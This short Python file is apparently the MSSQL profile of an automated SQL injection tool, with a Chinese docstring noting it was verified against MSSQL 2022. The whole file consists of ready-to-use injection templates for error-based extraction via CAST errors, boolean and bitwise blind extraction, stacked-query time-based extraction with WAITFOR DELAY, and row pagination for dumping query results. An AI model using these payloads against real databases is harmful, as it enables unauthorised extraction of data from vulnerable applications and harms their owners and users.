"""MSSQL 2005+ — 报错用 CAST 转换, 末尾拼 'x' 保证纯数值也报错; time 需堆叠查询支持。"""

PROFILE = {
    'name': 'mssql',
    'note': 'MSSQL 2022 (error/bool/time/union 已验证; Sybase ASE 可参考; OFFSET 需 2012+)',
    'err_tpl':   " AND 1=(SELECT CAST(SUBSTRING(({Q}),{P},{N})+'x' AS int))",
    'err_regex': "value '([^']*)'",
    'err_chunk': 500,
    'err_strip': 1,
    'bool_tpl':  " AND ASCII(SUBSTRING(({Q}),{P},1))>{K}",
    'bit_tpl':   " AND (ASCII(SUBSTRING(({Q}),{P},1))&{M})>0",
    'time_tpl':  ";IF ASCII(SUBSTRING(({Q}),{P},1))>{K} WAITFOR DELAY '0:0:{T}'",
    'row_wrap':  "SELECT * FROM ({Q}) x ORDER BY (SELECT NULL) OFFSET {R} ROWS FETCH NEXT 1 ROWS ONLY",
}
